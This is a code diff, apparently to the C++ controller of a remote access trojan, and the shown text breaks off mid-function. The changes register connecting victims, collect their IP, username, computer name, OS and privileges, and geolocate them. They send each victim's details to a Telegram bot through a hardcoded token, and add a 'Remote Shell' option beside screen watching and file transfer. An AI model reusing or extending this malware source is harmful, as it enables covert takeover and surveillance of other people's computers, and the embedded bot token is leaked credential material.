@@ -6,14 +6,17 @@
 #include "wndfuncs.h"
 #include "codepoints.h"
 #include "countrycoords.h"
+#include "shell.h"
 #include <set>
 
 HWND hwndList;
 HWND hwndButton;
 static HWND hwndClient = NULL;
 static HWND hwndFTP = NULL;
+static HWND hwndCMD = NULL;
 BOOL ishwndClient = false;
 BOOL ishwndFTP = false;
+BOOL ishwndCMD = false;
 UINT selectedMenuItem;
 UINT_PTR timerId;
 int itemIndex;
@@ -117,11 +120,11 @@ int ListenOnPort(HWND hwnd, int portno)
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
     {
+
         if (msg.message == WM_SOCKET)
         {
             if (WSAGETSELECTERROR(msg.lParam) != 0)
             {
-
             }
             else
             {
@@ -148,19 +151,18 @@ int ListenOnPort(HWND hwnd, int portno)
 
                         OutputDebugStringW(L"\nAccepted!\n");
                         clientSockets.push_back(newSd);
-                        std::string message = "Tato sprava bola poslana zo serveru.";
-
-                        for (auto& sAll : clientSockets)
-                        {
-
-                            send(sAll, message.c_str(), message.size(), 0);
-                        }
 
                         int error = WSAAsyncSelect(newSd, hwnd, WM_SOCKET, FD_READ);
                         if (error == 0)
                         {
 
                         }
+
+                        int sntData;
+                        do
+                        {
+                            sntData = send(newSd, "requsr", strlen("requsr"), 0);
+                        } while (sntData < 0);
 
                         SendMessageW(hwnd, WM_SOCKET, NULL, FD_CONNECT);
 
@@ -200,7 +202,7 @@ void TelegramServerStatus(boolean online)
     {
         txtmsg_chars = acPoint + "[" + greendotEmoji + "]" + " SERVER ONLINE " + "[" + greendotEmoji + "]";
     }
-    
+
     const char* txtmsg_char = txtmsg_chars.c_str();
 
     CURLM* multiHandle4 = curl_multi_init();
@@ -289,13 +291,10 @@ std::wstring GetCurrentSocketFromVector()
 
     return aCounter;
 }
+std::string xsedIp;
 
-
-void RequestUsername(HWND hwnd,int timerId)
+void RequestUsername(HWND hwnd, int timerId)
 {
-    SOCKET selectedSocket = clientSockets[itemIndex];
-    auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
-    send(selectedSocket, "requsr", strlen("requsr"), 0);
 
     SetTimer(hwnd, timerId, 100, NULL);
 }
@@ -318,7 +317,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             break;
 
         case FD_CONNECT:
-            if(addedClients.find(newSd) == addedClients.end())
+            if (addedClients.find(newSd) == addedClients.end())
             {
                 //Get IP
                 addedClients.insert(newSd);
@@ -334,215 +333,280 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 wchar_t* FinalIP = new wchar_t[aCounter.length() + 1];
                 wcscpy(FinalIP, aCounter.c_str());
 
-                LVITEM item;
-                item.mask = LVIF_TEXT | LVIF_PARAM;
-                item.iItem = ListView_GetItemCount(hwndList);
-                item.iSubItem = 0;
-                item.pszText = FinalIP;
-                item.lParam = newSd;
 
-                SendMessageW(hwndList, LVM_SETTEXTCOLOR, (WPARAM)0, (LPARAM)RGB(122, 5, 5));
-                int itemIndex = ListView_InsertItem(hwndList, &item);
+                SendMessageW(hwndList, LVM_SETTEXTCOLOR, (WPARAM)0, (LPARAM)RGB(0, 255, 255));
+                ListView_SetTextBkColor(hwndList, RGB(0, 0, 51));
                 g_itemIndex = itemIndex;
                 clientItems.insert(std::make_pair(counter, thisItemName));
 
-                //OS
-                osVersion = getSysOpType();
-                ListView_SetItemText(hwndList, itemIndex, 2, const_cast<LPWSTR>(osVersion.c_str()));
-
-                //PC Name
-                
-                DWORD size = sizeof(computerName) / sizeof(computerName[0]);
-                if (GetComputerNameW(computerName, &size)) {
-                    std::wstring pcName = computerName;
-                    ListView_SetItemText(hwndList, itemIndex, 1, (LPWSTR)pcName.c_str());
-                }
-                else {
-                    // handle error
-                }
-
-                RequestUsername(hwnd,1091);
-                
-                fIPStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(wip);
-
-                CURLM* multiHandle = curl_multi_init();
-
-                // Create a CURL handle for each URL to fetch
-                CURL* curl1 = curl_easy_init();
-                std::string url1 = "https://ipapi.co/" + fIPStr + "/country_name";
+                std::wstring IpAddr;
+                std::wstring IpAddrNew;
+                std::wstring usrName;
+                std::wstring PcNameNew;
+                std::wstring OsVersionNew;
+                std::wstring privilegesNew;
                 std::string response1;
-                curl_easy_setopt(curl1, CURLOPT_URL, url1.c_str());
-                curl_easy_setopt(curl1, CURLOPT_WRITEFUNCTION, writeFunction);
-                curl_easy_setopt(curl1, CURLOPT_WRITEDATA, &response1);
-                curl_multi_add_handle(multiHandle, curl1);
 
-                CURL* curl2 = curl_easy_init();
-                std::string url2 = "https://ipapi.co/" + fIPStr + "/country_code";
-                std::string response2;
-                curl_easy_setopt(curl2, CURLOPT_URL, url2.c_str());
-                curl_easy_setopt(curl2, CURLOPT_WRITEFUNCTION, writeFunction);
-                curl_easy_setopt(curl2, CURLOPT_WRITEDATA, &response2);
-                curl_multi_add_handle(multiHandle, curl2);
+                fd_set readSet;
+                FD_ZERO(&readSet);
+                FD_SET(newSd, &readSet);
 
-                // Process the requests
-                int runningHandles = 0;
-                do {
-                    curl_multi_perform(multiHandle, &runningHandles);
+                timeval timeout;
+                timeout.tv_sec = 2;  // wait for 3 seconds
+                timeout.tv_usec = 0;
 
-                    int numMessages = 0;
-                    CURLMsg* message;
-                    while ((message = curl_multi_info_read(multiHandle, &numMessages))) {
-                        if (message->msg == CURLMSG_DONE) {
-                            CURL* curl = message->easy_handle;
-                            CURLcode res = message->data.result;
-                            if (res == CURLE_OK) {
-                                if (curl == curl1) {
-                                    std::wstring responseW = converter.from_bytes(response1);
-                                    ListView_SetItemText(hwndList, itemIndex, 3, (LPWSTR)responseW.c_str());
-                                }
-                                else if (curl == curl2) {
-                                    for (int i = 0; i < clientSockets.size(); i++) {
-                                        clientToDotMap[clientSockets[i]] = i;
+                char buffer[1024];
+                int bytesReceived = 0;
+
+                int ready = select(newSd + 1, &readSet, NULL, NULL, &timeout);
+                if (ready == -1)
+                {
+
+                }
+                else if (ready == 0)
+                {
+                    closesocket(newSd);
+                    auto it = std::find(clientSockets.begin(), clientSockets.end(), newSd);
+                    if (it != clientSockets.end()) {
+                        clientSockets.erase(it);
+                    }
+                }
+                else
+                {
+                    bytesReceived = recv(newSd, buffer, sizeof(buffer), 0);
+
+                    if (bytesReceived < 0)
+                    {
+
+                    }
+                    else if (bytesReceived == 0)
+                    {
+
+                    }
+                    else
+                    {
+                        //MessageBoxA(hwnd, buffer, "s", MB_OK);
+                        // Handle successful receive
+                        std::string receivedStr(buffer, buffer + bytesReceived);
+
+                        // Find the positions of the pipe symbols
+                        size_t firstPipePos = receivedStr.find("|");
+                        size_t secondPipePos = receivedStr.find("|", firstPipePos + 1);
+                        size_t thirdPipePos = receivedStr.find("|", secondPipePos + 1);
+                        size_t fourthPipePos = receivedStr.find("|", thirdPipePos + 1);
+
+                        if (firstPipePos != std::string::npos && secondPipePos != std::string::npos && thirdPipePos != std::string::npos)
+                        {
+                            // Extract the IP address, username, and PC name
+                            std::string IP = receivedStr.substr(0, firstPipePos);
+                            std::string usernameStr = receivedStr.substr(firstPipePos + 1, secondPipePos - firstPipePos - 1);
+                            std::string pcName = receivedStr.substr(secondPipePos + 1, thirdPipePos - secondPipePos - 1);
+                            std::string osVersion = receivedStr.substr(thirdPipePos + 1, fourthPipePos - thirdPipePos - 1);
+                            std::string privileges = receivedStr.substr(fourthPipePos + 1);
+
+                            usrName = converter.from_bytes(usernameStr);
+                            IpAddr = converter.from_bytes(IP);
+                            PcNameNew = converter.from_bytes(pcName);
+                            OsVersionNew = converter.from_bytes(osVersion);
+                            privilegesNew = converter.from_bytes(privileges);
+
+                            wchar_t* newIp = new wchar_t[IpAddr.length() + 1];
+                            wcscpy(newIp, IpAddr.c_str());
+
+                            LVITEM item;
+                            item.mask = LVIF_TEXT | LVIF_PARAM;
+                            item.iItem = ListView_GetItemCount(hwndList);
+                            item.iSubItem = 0;
+                            item.pszText = newIp;
+                            item.lParam = newSd;
+
+                            int itemIndex = ListView_InsertItem(hwndList, &item);
+
+                            IpAddrNew = newIp;
+                            ListView_SetItemText(hwndList, itemIndex, 5, (LPWSTR)privilegesNew.c_str());
+
+                            ListView_SetItemText(hwndList, itemIndex, 4, (LPWSTR)usrName.c_str());
+
+                            ListView_SetItemText(hwndList, itemIndex, 2, (LPWSTR)OsVersionNew.c_str());
+
+                            //PC Name
+                            ListView_SetItemText(hwndList, itemIndex, 1, (LPWSTR)PcNameNew.c_str());
+
+                            fIPStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(IpAddrNew);
+
+                            CURLM* multiHandle = curl_multi_init();
+
+                            // Create a CURL handle for each URL to fetch
+                            CURL* curl1 = curl_easy_init();
+                            std::string url1 = "https://ipapi.co/" + fIPStr + "/country_name";
+                            curl_easy_setopt(curl1, CURLOPT_URL, url1.c_str());
+                            curl_easy_setopt(curl1, CURLOPT_WRITEFUNCTION, writeFunction);
+                            curl_easy_setopt(curl1, CURLOPT_WRITEDATA, &response1);
+                            curl_multi_add_handle(multiHandle, curl1);
+
+                            CURL* curl2 = curl_easy_init();
+                            std::string url2 = "https://ipapi.co/" + fIPStr + "/country_code";
+                            std::string response2;
+                            curl_easy_setopt(curl2, CURLOPT_URL, url2.c_str());
+                            curl_easy_setopt(curl2, CURLOPT_WRITEFUNCTION, writeFunction);
+                            curl_easy_setopt(curl2, CURLOPT_WRITEDATA, &response2);
+                            curl_multi_add_handle(multiHandle, curl2);
+
+                            // Process the requests
+                            int runningHandles = 0;
+                            do {
+                                curl_multi_perform(multiHandle, &runningHandles);
+
+                                int numMessages = 0;
+                                CURLMsg* message;
+                                while ((message = curl_multi_info_read(multiHandle, &numMessages))) {
+                                    if (message->msg == CURLMSG_DONE) {
+                                        CURL* curl = message->easy_handle;
+                                        CURLcode res = message->data.result;
+                                        if (res == CURLE_OK) {
+                                            if (curl == curl1) {
+                                                std::wstring responseW = converter.from_bytes(response1);
+                                                ListView_SetItemText(hwndList, itemIndex, 3, (LPWSTR)responseW.c_str());
+                                            }
+                                            else if (curl == curl2) {
+                                                for (int i = 0; i < clientSockets.size(); i++) {
+                                                    clientToDotMap[clientSockets[i]] = i;
+                                                }
+                                                std::map<std::string, Coordinates> countryCoords;
+                                                Country country;
+                                                srand(time(0));
+                                                countryCoords["SK"] = { country.SKx, country.SKy };
+                                                countryCoords["US"] = { country.USx, country.USy };
+                                                countryCoords["CZ"] = { country.CZx, country.CZy };
+                                                countryCoords["Undefined"] = { country.CNx, country.CNy };
+                                                auto coords = countryCoords[response2];
+                                                DOT newDot;
+
+                                                newDot.dotX = coords.x;
+                                                newDot.dotY = coords.y;
+                                                newDot.dotRadius = 4;
+
+                                                // Add the new dot to the dots array
+                                                dots[numDots] = newDot;
+                                                numDots++;
+
+                                                // Redraw the window to display the new dot
+                                                InvalidateRect(hwnd, NULL, TRUE);
+                                            }
+                                        }
+                                        else {
+                                            std::cerr << "cURL error: " << curl_easy_strerror(res) << std::endl;
+                                        }
+                                        curl_multi_remove_handle(multiHandle, curl);
+                                        curl_easy_cleanup(curl);
                                     }
-                                    std::map<std::string, Coordinates> countryCoords;
-                                    Country country;
-                                    srand(time(0));
-                                    countryCoords["SK"] = { country.SKx, country.SKy };
-                                    countryCoords["US"] = { country.USx, country.USy };
-                                    countryCoords["CZ"] = { country.CZx, country.CZy };
-                                    countryCoords["Undefined"] = { country.CNx, country.CNy };
-                                    auto coords = countryCoords[response2];
-                                    DOT newDot;
+                                }
+                            } while (runningHandles > 0);
 
-                                    newDot.dotX = coords.x;
-                                    newDot.dotY = coords.y;
-                                    newDot.dotRadius = 4;
+                            // Cleanup
+                            curl_multi_cleanup(multiHandle);
+                        }
 
-                                    // Add the new dot to the dots array
-                                    dots[numDots] = newDot;
-                                    numDots++;
 
-                                    // Redraw the window to display the new dot
-                                    InvalidateRect(hwnd, NULL, TRUE);
+
+
+                        CURL* curl3;
+                        CURLcode res;
+                        std::string response3;
+                        std::string OSstr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(OsVersionNew);
+                        std::string pcNameStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(PcNameNew);
+                        std::string pcUserStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(usrName);
+                        std::string privilegesNewStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(privilegesNew);
+
+                        if (response2 == "CZ")
+                        {
+                            flagEmoji = u8"\U0001F1E8\U0001F1FF";
+                        }
+                        if (response2 == "Undefined")
+                        {
+                            flagEmoji = u8"\U0001F3F4";
+                        }
+
+
+                        std::string userCount = " : " + std::to_string(counter) + "\n";
+                        std::string ipPrint = " IP ADDRESS : " + fIPStr + "\n";
+                        std::string osPrint = " OPERATION SYSTEM : " + OSstr + "\n";
+                        std::string countryPrint = " COUNTRY : " + response1 + "\n";
+                        std::string pcnamePrint = " COMPUTER NAME : " + pcNameStr + "\n";
+                        std::string userPrint = " USERNAME : " + pcUserStr + "\n";
+                        std::string privilegesPrint = " PRIVILEGES : " + privilegesNewStr + "\n";
+                        std::string txtmsg = "chat_id=" + chat_id + "&text=" +
+                            ratEmoji + " " + dollarEmoji + " " + resulttitle() + " " + dollarEmoji + " " + ratEmoji + "\n" +
+                            greendotEmoji + " CONNECTED " + greendotEmoji + "\n" +
+                            IDemoji + userCount +
+                            IPemoji + ipPrint +
+                            OSemoji + osPrint +
+                            flagEmoji + countryPrint +
+                            pcnameEmoji + pcnamePrint +
+                            privilegesEmoji + privilegesPrint +
+                            userEmoji + userPrint;
+
+                        const char* txtmsg_char = txtmsg.c_str();
+
+                        CURLM* multiHandle4 = curl_multi_init();
+
+                        // Create a list of easy handles to add to the multi handle
+                        std::vector<CURL*> easyHandles;
+                        CURL* curl4 = curl_easy_init();
+                        if (curl4) {
+                            curl_easy_setopt(curl4, CURLOPT_URL, "https://api.telegram.org/bot5781417296:AAEBpOKMGE_QDYsJu5nqQiXFXyWCU-fgDN0/sendMessage");
+                            curl_easy_setopt(curl4, CURLOPT_POSTFIELDS, txtmsg_char);
+                            curl_easy_setopt(curl4, CURLOPT_WRITEFUNCTION, writeFunction);
+                            curl_easy_setopt(curl4, CURLOPT_WRITEDATA, &response3);
+
+                            easyHandles.push_back(curl4);
+                        }
+
+                        for (CURL* easyHandle : easyHandles) {
+                            curl_multi_add_handle(multiHandle4, easyHandle);
+                        }
+
+                        int stillRunning = 1;
+                        while (stillRunning) {
+                            curl_multi_perform(multiHandle4, &stillRunning);
+
+                            int msgsInQueue;
+                            CURLMsg* msg;
+                            while ((msg = curl_multi_info_read(multiHandle4, &msgsInQueue))) {
+                                if (msg->msg == CURLMSG_DONE) {
+                                    CURL* easyHandle = msg->easy_handle;
+                                    char* response;
+                                    curl_easy_getinfo(easyHandle, CURLINFO_PRIVATE, &response);
+
+                                    if (msg->data.result == CURLE_OK) {
+
+                                    }
+                                    else {
+
+                                    }
+                                    curl_multi_remove_handle(multiHandle4, easyHandle);
+                                    curl_easy_cleanup(easyHandle);
+                                    free(response);
                                 }
                             }
-                            else {
-                                std::cerr << "cURL error: " << curl_easy_strerror(res) << std::endl;
+
+                            int numFds;
+                            int selectResult = curl_multi_wait(multiHandle4, NULL, 0, 1000, &numFds);
+                            if (selectResult != CURLM_OK) {
+                                // ...
                             }
-                            curl_multi_remove_handle(multiHandle, curl);
-                            curl_easy_cleanup(curl);
                         }
-                    }
-                } while (runningHandles > 0);
 
-                // Cleanup
-                curl_multi_cleanup(multiHandle);
+                        curl_multi_cleanup(multiHandle4);
 
-                CURL* curl3;
-                CURLcode res;
-                std::string response3;
-                std::string OSstr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(osVersion);
-                std::string pcNameStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(computerName);
-
-                if (response2 == "CZ")
-                {
-                    flagEmoji = u8"\U0001F1E8\U0001F1FF";
-                }
-                if (response2 == "Undefined")
-                {
-                    flagEmoji = u8"\U0001F3F4";
-                }
-
-
-                std::string userCount = " : " + std::to_string(counter) + "\n";
-                std::string ipPrint = " IP ADDRESS : " + fIPStr + "\n";
-                std::string osPrint = " OPERATION SYSTEM : " + OSstr + "\n";
-                std::string countryPrint = " COUNTRY : " + response1 + "\n";
-                std::string pcnamePrint = " COMPUTER NAME : " + pcNameStr + "\n";
-                std::string txtmsg = "chat_id=" + chat_id + "&text=" +
-                    ratEmoji + " " + dollarEmoji + " " + resulttitle() + " " + dollarEmoji + " " + ratEmoji + "\n" +
-                    greendotEmoji + " CONNECTED " + greendotEmoji + "\n" +
-                    IDemoji + userCount +
-                    IPemoji + ipPrint +
-                    OSemoji + osPrint +
-                    flagEmoji + countryPrint +
-                    pcnameEmoji + pcnamePrint;
-
-                const char* txtmsg_char = txtmsg.c_str();
-
-                CURLM* multiHandle4 = curl_multi_init();
-
-                // Create a list of easy handles to add to the multi handle
-                std::vector<CURL*> easyHandles;
-                CURL* curl4 = curl_easy_init();
-                if (curl4) {
-                    curl_easy_setopt(curl4, CURLOPT_URL, "https://api.telegram.org/bot5781417296:AAEBpOKMGE_QDYsJu5nqQiXFXyWCU-fgDN0/sendMessage");
-                    curl_easy_setopt(curl4, CURLOPT_POSTFIELDS, txtmsg_char);
-                    curl_easy_setopt(curl4, CURLOPT_WRITEFUNCTION, writeFunction);
-                    curl_easy_setopt(curl4, CURLOPT_WRITEDATA, &response3);
-
-                    easyHandles.push_back(curl4);
-                }
-
-                // Add the easy handles to the multi handle
-                for (CURL* easyHandle : easyHandles) {
-                    curl_multi_add_handle(multiHandle4, easyHandle);
-                }
-
-                // Perform the requests in a non-blocking manner
-                int stillRunning = 1;
-                while (stillRunning) {
-                    curl_multi_perform(multiHandle4, &stillRunning);
-
-                    // Check for completed transfers
-                    int msgsInQueue;
-                    CURLMsg* msg;
-                    while ((msg = curl_multi_info_read(multiHandle4, &msgsInQueue))) {
-                        if (msg->msg == CURLMSG_DONE) {
-                            // Get the easy handle and response data for the completed transfer
-                            CURL* easyHandle = msg->easy_handle;
-                            char* response;
-                            curl_easy_getinfo(easyHandle, CURLINFO_PRIVATE, &response);
-
-                            // Handle the response as needed
-                            if (msg->data.result == CURLE_OK) {
-                                // Handle successful response
-                                // ...
-
-                            }
-                            else {
-                                // Handle error response
-                                // ...
-                            }
-
-                            // Remove the easy handle from the multi handle and clean it up
-                            curl_multi_remove_handle(multiHandle4, easyHandle);
-                            curl_easy_cleanup(easyHandle);
-                            free(response);
+                        if (itemIndex != -1)
+                        {
+                            counter++;
                         }
                     }
 
-                    // Wait for activity on the handles using the multi handle timeout
-                    int numFds;
-                    int selectResult = curl_multi_wait(multiHandle4, NULL, 0, 1000, &numFds);
-                    if (selectResult != CURLM_OK) {
-                        // Handle error
-                        // ...
-                    }
                 }
 
-                // Clean up the multi handle
-                curl_multi_cleanup(multiHandle4);
-
-                
-
-                SetTimer(hwnd, 1087, 500, NULL);
-
-
-                if (itemIndex != -1)
-                {
-                    counter++;
-                }
             }
             SetTimer(hwnd, 12, 1000, NULL);
             break;
@@ -602,9 +666,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                         clientToDotMap.erase(dotIndex);
                     }
 
-                addedClients.erase(*it); // Remove the client from the addedClients set
-                closesocket(*it);
-                it = clientSockets.erase(it); // Remove the client from the clientSockets vector
+                    addedClients.erase(*it);
+                    closesocket(*it);
+                    it = clientSockets.erase(it);
 
                 }
                 else
@@ -612,37 +676,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                     ++it;
                     std::cout << "DATA RECV" << std::endl;
                 }
-            
-            }
-        }
-        if (wParam == 1091)
-        {
-            SOCKET selectedSocket = clientSockets[g_itemIndex];
-            char buffer[1024];
-            int bytesReceived = recv(selectedSocket, buffer, sizeof(buffer), 0);
-            if (bytesReceived > 0)
-            {
-                // Handle successful receive
-                std::string usernameStr(buffer, buffer + bytesReceived);
-                pcUsername = usernameStr;
-                
-                //MessageBoxW(NULL, usrName.c_str(), L"s", MB_OK);
-                KillTimer(hwnd, 1091);
-            }
-            else if (bytesReceived == 0 || (bytesReceived == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET))
-            {
-                // Handle socket error or disconnection
-                KillTimer(hwnd, 1091);
-            }
-        }
 
-        if (wParam == 1087)
-        {
-            std::wstring usrName = converter.from_bytes(pcUsername);
-            ListView_SetItemText(hwndList, itemIndex, 4, (LPWSTR)usrName.c_str());
-            KillTimer(hwnd, 1087);
+            }
         }
-
 
         if (wParam == 1069)
         {
@@ -662,7 +698,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         }
         break;
     }
-    
+
 
     case WM_CREATE:
         hwndList = CreateWindowW(WC_LISTVIEW, L"",
@@ -676,12 +712,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         CreateColumn(hwndList, 25, 100, (wchar_t*)L"Operation Sys");
         CreateColumn(hwndList, 25, 100, (wchar_t*)L"Country");
         CreateColumn(hwndList, 25, 130, (wchar_t*)L"User");
+        CreateColumn(hwndList, 25, 130, (wchar_t*)L"Privileges");
         SendMessageW(hwndList, LVM_SETBKCOLOR, 0, (LPARAM)clrRed);
 
         timerId = SetTimer(hwnd, 12, 1000, NULL);
         SetTimer(hwnd, 1069, 200, NULL);
 
-        OnCreate(hwnd,wParam,lParam);
+        OnCreate(hwnd, wParam, lParam);
         break;
 
     case WM_PAINT:
@@ -735,10 +772,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             InsertMenu(hMenu, 0, MF_BYPOSITION, CLIENT_SENDCOMMAND, L"Send Command");
             InsertMenu(hMenu, 1, MF_BYPOSITION, CLIENT_WATCHSCREEN, L"Watch Screen");
             InsertMenu(hMenu, 2, MF_BYPOSITION, CLIENT_FTP, L"File Transfer");
-            InsertMenu(hMenu, 3, MF_BYPOSITION, CLIENT_FUN, L"Fun");
-            InsertMenu(hMenu, 4, MF_BYPOSITION, CLIENT_REMOVE, L"Remove Client");
+            InsertMenu(hMenu, 3, MF_BYPOSITION, CLIENT_REMOTE_SHELL, L"Remote Shell");
+            InsertMenu(hMenu, 4, MF_BYPOSITION, CLIENT_FUN, L"Fun");
+            InsertMenu(hMenu, 5, MF_BYPOSITION, CLIENT_REMOVE, L"Remove Client");
             SetMenuItemBitmaps(hMenu, CLIENT_SENDCOMMAND, MF_BYCOMMAND, hCmdItemIcon, hCmdItemIcon);
             SetMenuItemBitmaps(hMenu, CLIENT_WATCHSCREEN, MF_BYCOMMAND, hScreenItemIcon, hScreenItemIcon);
+            SetMenuItemBitmaps(hMenu, CLIENT_REMOTE_SHELL, MF_BYCOMMAND, hCmdItemIcon, hCmdItemIcon);
             SetMenuItemBitmaps(hMenu, CLIENT_FUN, MF_BYCOMMAND, hFunItemIcon, hFunItemIcon);
             SetMenuItemBitmaps(hMenu, CLIENT_REMOVE, MF_BYCOMMAND, hRmClientItemIcon, hRmClientItemIcon);
             SetMenuItemBitmaps(hMenu, CLIENT_FTP, MF_BYCOMMAND, hFtpClientItemIcon, hFtpClientItemIcon);
@@ -770,7 +809,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
         break;
     }
-        
+
 
 
     case WM_COMMAND:
@@ -813,6 +852,52 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             }
             break;
         }
+
+        case CLIENT_REMOTE_SHELL:
+        {
+            const int gHwndClientWidth = 600;
+            const int gHwndClientHeight = 550;
+
+            SOCKET selectedSocket = clientSockets[itemIndex];
+            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
+            if (it != clientSockets.end())
+            {
+                RemoteShell remoteShell;
+                remoteShell.WndClientCMDRegisterClass(hInstance);
+
+                LVITEM lvItem;
+                lvItem.mask = LVIF_TEXT;
+                lvItem.iItem = itemIndex;
+                lvItem.iSubItem = 0;
+                lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
+                lvItem.cchTextMax = sizeof(aCounter);
+
+                ListView_GetItem(hwndList, &lvItem);
+
+                int socketIndex = std::distance(clientSockets.begin(), it);
+
+                hwndCMD = CreateWindowExW(
+                    WS_EX_CLIENTEDGE,
+                    g_szClientCMDClassName,
+                    aCounter.c_str(),
+                    WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_CLIPSIBLINGS,
+                    CW_USEDEFAULT, CW_USEDEFAULT, gHwndClientWidth, gHwndClientHeight,
+                    hwnd, NULL, hInstance, NULL);
+
+
+                if (hwndCMD == NULL)
+                {
+                    return 0;
+                }
+
+                ishwndCMD = true;
+
+                ShowWindow(hwndCMD, SW_SHOW);
+            }
+
+            break;
+        }
+
 
         case CLIENT_FTP:
         {
@@ -859,8 +944,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
         case CLIENT_WATCHSCREEN:
         {
-            const int gHwndClientWidth = 800;
-            const int gHwndClientHeight = 600;
+            const int gHwndClientWidth = 900;
+            const int gHwndClientHeight = 700;
 
             SOCKET selectedSocket = clientSockets[itemIndex];
             auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
@@ -875,9 +960,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
                 ListView_GetItem(hwndList, &lvItem);
 
-                
+
                 int socketIndex = std::distance(clientSockets.begin(), it);
-                
+
                 hwndClient = CreateWindowExW(
                     WS_EX_CLIENTEDGE,
                     g_szClientClassName,
@@ -964,7 +1049,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         ExitProcess(0);
         break;
     }
-    
+
     default:
         return DefWindowProc(hwnd, msg, wParam, lParam);
     }
@@ -972,11 +1057,14 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 };
 
 HWND hFtpList;
+HWND hFtpDiscList;
 LVCOLUMN lvColumn = { 0 };
 SOCKET FTPSOCK;
 FtpMenu ftpmenu;
-std::wstring selectedName = L"";
+std::wstring selectedName = L"C:\\";
 std::wstring allSelectedNames;
+std::wstring request;
+std::vector<char> requestBuffer;
 
 LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
@@ -989,9 +1077,12 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
     {
         FTPSOCK = clientSockets[itemIndex];
         auto it = std::find(clientSockets.begin(), clientSockets.end(), FTPSOCK);
-        
+
+
         hFtpList = CreateWindowW(WC_LISTVIEW, L"", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL,
             10, 10, 500, 300, FtpHwnd, NULL, GetModuleHandle(NULL), NULL);
+
+        ListView_SetBkColor(hFtpList, RGB(0, 0, 51));
 
         // Add columns to the list control
         lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
@@ -999,11 +1090,12 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
         lvColumn.cx = 200;
         ListView_InsertColumn(hFtpList, 0, &lvColumn);
 
-        lvColumn.pszText = (LPWSTR)L"Size";
+        lvColumn.pszText = (LPWSTR)L"Type";
         lvColumn.cx = 100;
         ListView_InsertColumn(hFtpList, 1, &lvColumn);
 
         dpItem.GlobalButtons(FtpHwnd);
+
 
         SetTimer(FtpHwnd, 1440, 100, NULL);
         break;
@@ -1084,7 +1176,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
                 std::wstring searchPath = L"C:\\";
 
                 if (!allSelectedNames.empty()) {
-                    searchPath += allSelectedNames;
+                    searchPath = allSelectedNames;
 
                     wchar_t canonicalPath[MAX_PATH];
                     if (PathCanonicalize(canonicalPath, searchPath.c_str())) {
@@ -1204,6 +1296,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
                         std::vector<char> requestBuffer(len + 1);
                         WideCharToMultiByte(CP_UTF8, 0, request.c_str(), request.length(), requestBuffer.data(), len, NULL, NULL);
                         updatedName = requestBuffer.data();
+
                         int x = send(FTPSOCK, requestBuffer.data(), requestBuffer.size(), 0);
 
                         Sleep(100);
@@ -1213,6 +1306,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
                         if (lenRecv > 0)
                         {
                             ftpmenu.UpdateItems(FtpHwnd, hFtpList, buffer, lenRecv);
+                            //send(FTPSOCK, "startscreen", strlen("startscreen"), 0);
                         }
 
                         allSelectedNames += selectedName;
@@ -1225,6 +1319,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
 
     case WM_TIMER:
     {
+
         if (LOWORD(wParam == 1440))
         {
             send(FTPSOCK, "requestdirs", strlen("requestdirs"), 0);
@@ -1233,18 +1328,20 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
 
             char buffer[4096];
             int len = recv(FTPSOCK, buffer, sizeof(buffer), 0);
-            if (len > 0)
-            {
 
+
